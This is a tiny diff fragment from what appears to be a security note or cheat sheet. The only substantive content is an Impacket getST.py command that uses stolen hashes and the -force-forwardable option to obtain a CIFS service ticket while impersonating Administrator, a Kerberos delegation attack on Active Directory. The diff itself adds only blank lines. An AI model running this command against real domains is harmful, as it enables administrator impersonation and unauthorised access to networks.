@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:26:20.679788+00:00'
 ```bash
 $ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller>
 ```
+
+
